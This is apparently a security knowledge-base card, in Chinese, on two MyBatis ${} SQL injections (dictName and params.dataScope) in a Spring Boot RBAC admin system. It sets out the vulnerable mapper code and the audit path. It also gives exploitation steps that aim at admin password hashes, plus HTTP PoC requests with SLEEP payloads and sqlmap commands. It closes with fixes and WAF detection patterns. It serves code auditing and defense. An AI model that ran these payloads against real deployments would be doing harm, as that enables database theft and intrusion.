---
id: web-generic-sqli-spring-rbac-mybatis-dollar-dictname-datascope
title: Spring Boot RBAC 系统 MyBatis ${} 两处注入：字典 dictName LIKE 与部门 params.dataScope 数据范围
type: scenario
domain: web
path: web/generic/sqli
technique: mybatis-dollar-brace-dictname-datascope-injection
aliases:
- MyBatis ${dictName}
- MyBatis ${params.dataScope}
- my-springsecurity-plus SQL注入
- DictMapper 注入
- DeptMapper 注入
- BaseEntity params 注入
- 数据范围注入
tags:
- sqli
- mybatis
- java
- spring-boot
- like-injection
- dollar-brace
- data-scope
- code-audit
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V272
  verified_at: '2026-11-07T23:31:37+08:00'
  notes: 已对照原文与全部61张图核对：DictMapper getFuzzyDictByPage 的 LIKE CONCAT('%',${dictName},'%')（图08/16 旧版）、DictController /api/dict dict:list→DictService→DictDao 链（图09-11）、抓包 GET /api/dict?page=1&limit=10&dictName=1（图14）、sqlmap 布尔/时间盲注与 MySQL>=5.0.12（图15）、新旧版 ${}→#{} 对比（图16）；DeptMapper getFuzzyDept 的 ${params.dataScope}（图17）、BaseEntity.params Map 绑定（图21-22）、DeptController /api/dept dept:edit（图20）、未编码 400（Invalid character in request target，图25）与 params%5B%22dataScope%22%5D=1 成功（图26）、sqlmap 布尔/时间/UNION 3 列（图27）。已修正卡内一处精度问题：Dict 截图仅见布尔/时间盲注，UNION 仅 Dept 实测，已分开表述。原子性：两处为同一 MyBatis ${} 注入技术在本项目的两个端点实例（文中第一处/第二处），按库内多入口实例卡惯例保留为单卡，不标 split。未验证点：未本机复跑 sqlmap/项目；无版本号，未设 affected_versions；frontmatter 无 sources/source_url。dedup 为 new/related（NewBeeMall/RuoYi/RootHub/通用 ${} 卡均不同产品或不同触发），dup-scan 无本卡 pair。
---

## 一句话结论

Spring Boot + MyBatis 的 RBAC 后台若在 Mapper XML 中使用 `${}` 拼接用户可控值，就会形成 SQL 注入：该系统 `DictMapper.xml` 的 `getFuzzyDictByPage` 把 `${dictName}` 直接放进 `LIKE CONCAT('%', ..., '%')`，`DeptMapper.xml` 的 `getFuzzyDept` 把 `${params.dataScope}` 直接放进 `WHERE`；前者可通过 `GET /api/dict?dictName=` 注入（最新版已改为 `#{}` 修复），后者可通过 `GET /api/dept/build?params%5B%22dataScope%22%5D=` 注入（最新版仍存在），后端为 MySQL；sqlmap 实测 Dict 为布尔/时间盲注，Dept 为布尔/时间/UNION（3 列）注入。

## 原理

- MyBatis 的 `#{}` 生成 JDBC `?` 预编译占位符，参数只作为值；`${}` 在 SQL 解析前做纯文本替换，用户输入直接进入 SQL 语法层。Mapper 中任何用户可控的 `${}` 都等价于字符串拼接。
- **Dict 注入点**：`src/main/resources/mybatis-mappers/DictMapper.xml` 的 `<select id="getFuzzyDictByPage">`：
  ```xml
  <if test="dictName != null and dictName != ''">
    AND di.dict_name like CONCAT('%', ${dictName}, '%')
  </if>
  ```
  `dictName` 来自 `MyDict` 实体，经 `DictController.getDictAll(PageTableRequest, MyDict)`（`@RequestMapping("/api/dict")`，`@PreAuthorize("hasAnyAuthority('dict:list')")`）传入 `dictService.getDictPage()` / `dictDao.getFuzzyDictByPage(myDict)`，Controller/Service 没有白名单或转义。请求 `GET /api/dict?page=1&limit=10&dictName=1` 即触发。
- **Dept 注入点**：`DeptMapper.xml` 的 `<select id="getFuzzyDept">`：
  ```xml
  <!-- 数据范围过滤 -->
  ${params.dataScope}
  ```
  `params` 不是 `DeptController` 的显式参数，而是继承自 `BaseEntity` 的 `Map<String,Object> params` 字段（`com.codermy.myspringsecurityplus.admin.entity.BaseEntity`）；Spring MVC 会按 `params["dataScope"]` 形式绑定请求参数。`DeptController.getDeptAll(MyDept myDept)`（`@RequestMapping("/api/dept")`，`@PreAuthorize("hasAnyAuthority('dept:edit')")`）调用 `deptService.getDeptAll(myDept)`，数据层把 `params.dataScope` 原样拼进 `WHERE`。URL 中 `["` 等字符需要编码，`params%5B%22dataScope%22%5D=1` 可被解析（未编码会触发 Tomcat 400 `Invalid character found in the request target`）。
- 全局搜索 `${` 还会在 `RoleMapper.xml`（`${params.dataScope}`）、`UserMapper.xml`（`u.nick_name like CONCAT('%', ${nickName}, '%')`）等文件命中同类拼接点；文章实测了 Dict 与 Dept 两处。
- 两处均为 MySQL（sqlmap 识别 `MySQL >= 5.0.12`）。Dict 实测布尔盲注与时间盲注（`SLEEP`）；Dept 实测布尔盲注、时间盲注与 UNION（3 列）。`dictName` 位于 `LIKE CONCAT` 的字符串上下文，闭合单引号即可；`params.dataScope` 位于 `WHERE` 的表达式上下文，同样可拼接 `AND`/`UNION`。

## 触发条件

- 目标为 Spring Boot + MyBatis 的 Java Web 应用，Mapper XML 中存在 `${}` 且其值来自请求参数/实体字段。
- 对应接口可达且攻击者具备最小权限（Dict 需要 `dict:list`，Dept 需要 `dept:edit`；实际后台低权账号/越权路径也可能满足）。
- 后端为 MySQL（或可替换对应数据库的盲注语法）。
- 未在 Controller/Service/DAO 层对 `${}` 参数做白名单、类型转换或转义。

## 利用步骤

1. 审计入口：检查 `pom.xml` 是否引入 MyBatis（如 `mybatis-spring-boot-starter`）；全局搜索 `${`，记录 Mapper 文件、SQL 片段与参数名。
2. 沿 `Mapper id → DAO 接口 → Service → Controller` 追踪参数来源，确认是否可由请求控制；对继承 `BaseEntity` 的实体，注意 `params` Map 可被 `params["key"]` 形式绑定。
3. Dict：登录后台（`dict:list`），在字典管理页搜索并抓包 `GET /api/dict?page=1&limit=10&dictName=1`；把 `dictName` 替换为 `1' AND '1'='1`、`1' AND SLEEP(5)-- -` 等，或用 sqlmap 指定 `-p dictName --technique=BTU`。
4. Dept：构造 `GET /api/dept/build?params%5B%22dataScope%22%5D=1`（注意 URL 编码）；测试布尔/时间/UNION；sqlmap 指定 `-p params%5B%22dataScope%22%5D` 或使用 `--data`/`--level` 让其识别。
5. 确认注入后提取数据库名、表名、管理员密码哈希/用户信息；高权限数据库账户下可尝试文件写入/扩展存储过程（视 MySQL 权限与配置）。
6. 版本对比：Dict 处在最新版已改为 `#{dictName}`，Dept 处最新版仍为 `${params.dataScope}`；审计其他 `${}` 点（RoleMapper/UserMapper）同样需要验证。

## PoC

```http
# Dict：dictName LIKE 注入（后台 dict:list）
GET /api/dict?page=1&limit=10&dictName=1 HTTP/1.1
Host: target:8088
Cookie: <低权/后台会话>

# 时间盲注（sqlmap 实际识别到的 payload 形式）
GET /api/dict?page=1&limit=10&dictName=1 AND (SELECT 9110 FROM (SELECT(SLEEP(5)))x)-- HTTP/1.1
```

```http
# Dept：params["dataScope"] 注入（注意 URL 编码，未编码会被 Tomcat 400 拒绝）
GET /api/dept/build?params%5B%22dataScope%22%5D=1 HTTP/1.1
Host: target:8088

# 时间/UNION 注入示例
GET /api/dept/build?params%5B%22dataScope%22%5D=1 AND (SELECT 6621 FROM (SELECT(SLEEP(5)))x)-- HTTP/1.1
```

```bash
# sqlmap（示意；实际参数名/编码按抓包调整）
python sqlmap.py -u "http://target:8088/api/dict?page=1&limit=10&dictName=1" -p dictName --dbms=mysql --technique=BTU --batch
python sqlmap.py -u "http://target:8088/api/dept/build?params%5B%22dataScope%22%5D=1" -p 'params["dataScope"]' --dbms=mysql --technique=BTU --batch
```

## 变体与关联

- 同类通用技术：[[web-generic-sqli-mybatis-dollar-brace-injection]]（`${}` 的值/表名/ORDER BY/IN/LIKE 五类拼接点）；本卡是该技术在具体 Spring Boot RBAC 项目上的两个实例，额外展示了 `BaseEntity.params` Map 绑定与 URL 编码细节。
- 同类具体实例：[[web-generic-sqli-newbeemall-mybatis-dollar-goodsname-keyword]]（NewBeeMall 的 `${goodsName}`/`${keyword}` LIKE 注入）。
- 同项目其他 `${}` 点：`RoleMapper.xml` 的 `${params.dataScope}`、`UserMapper.xml` 的 `${nickName}`，文章中仅全局搜索命中、未逐点验证，可作为后续审计线索。
- 其他 JHSoft/OA MyBatis 注入卡：[[web-generic-sqli-jhsoft-tasktreejson-id-concat]]、[[web-generic-sqli-jhsoft-incentiveplan-fulfill-incentiveid-version]]。

## 检测与防御

- 代码修复：能改成 `#{}` 的 `${}` 一律改；LIKE 场景用 `CONCAT('%', #{dictName}, '%')`；`params.dataScope` 这类动态 SQL 片段必须由服务端白名单生成（如固定枚举/预定义片段），不能接受客户端传入的原始 SQL。
- 参数绑定：不要用 `Map<String,Object>`/实体字段直接接收并拼接 SQL 片段；对 `params` 做类型/键名白名单，禁止 `dataScope` 之外的键进入 Mapper。
- 数据层：使用 MyBatis 拦截器/SQL 注入检查、静态代码扫描（Semgrep/CodeQL 规则匹配 `${`）；对 Mapper 中的 `${}` 建立清单并逐项评审。
- 运行与监测：数据库账户最小权限；WAF 检测 `SLEEP(`、`BENCHMARK(`、`UNION SELECT`、`AND (SELECT` 等；MyBatis SQL 日志（`StdOutImpl`）不应在生产开启；对 `/api/dict`、`/api/dept/build` 的异常参数和响应时间做告警。
